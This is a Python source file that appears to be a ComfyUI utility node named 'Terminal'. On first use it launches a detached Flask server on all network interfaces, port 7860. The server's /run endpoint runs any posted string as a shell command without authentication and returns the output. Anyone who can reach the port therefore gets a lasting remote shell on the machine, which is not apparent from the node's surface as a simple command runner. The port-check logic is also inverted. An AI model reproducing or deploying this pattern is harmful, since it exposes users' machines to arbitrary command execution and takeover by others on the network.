import subprocess
import os
import threading
import sys
import time
import multiprocessing
from flask import Flask, request, jsonify

class Terminal:
    # Class variables to track API process and prevent multiple instances
    api_process = None

    def __init__(self):
        # Initialize the Flask app within the class
        self.app = Flask(__name__)
        self.setup_routes()

    @classmethod
    def INPUT_TYPES(cls):
        return {
            "required": {
                "command": ("STRING", {"multiline": False}),
            }
        }

    RETURN_TYPES = ("STRING",)
    FUNCTION = "execute"
    CATEGORY = "utils"

    def setup_routes(self):
        # Define the API route within the class
        @self.app.route('/run', methods=['POST'])
        def run_command():
            data = request.get_json()
            if not data or 'command' not in data:
                return jsonify({'error': 'No command provided'}), 400

            command = data['command']

            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return jsonify({'output': result.decode('utf-8')}), 200
            except subprocess.CalledProcessError as e:
                return jsonify({'error': e.output.decode('utf-8')}), 400

    def kill_process_on_port(self, port):
        try:
            # For Unix-like systems
            result = subprocess.check_output(f"lsof -ti:{port}", shell=True)
            pids = result.decode().strip().split('\n')
            for pid in pids:
                if pid:
                    os.kill(int(pid), 9)
        except subprocess.CalledProcessError:
            # No process running on the port
            pass

    def is_port_in_use(self, port):
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('localhost', port)) == 0

    def start_api(self):
        # Run the Flask app
        self.app.run(host='0.0.0.0', port=7860, threaded=True, use_reloader=False)

    def execute(self, command):
        port = 7860
        if not self.is_port_in_use(port):
            self.kill_process_on_port(port)
            print("Starting API...")
            # Start the API server in a separate process
            command_to_run = [sys.executable, os.path.abspath(__file__), 'start_api']
            subprocess.Popen(command_to_run, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
            print("Waiting for API to start...")
            time.sleep(2)
        else:
            print("API already running.")
        # Now execute the command via the API
        import requests
        try:
            response = requests.post(f'http://localhost:{port}/run', json={'command': command})
            if response.status_code == 200:
                output = response.json().get('output', '')
                return (output,)
            else:
                error = response.json().get('error', 'Unknown error')
                return (f"Error: {error}",)
        except requests.exceptions.ConnectionError:
            return ("Error: Could not connect to the API.",)

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'start_api':
        terminal = Terminal()
        terminal.start_api()
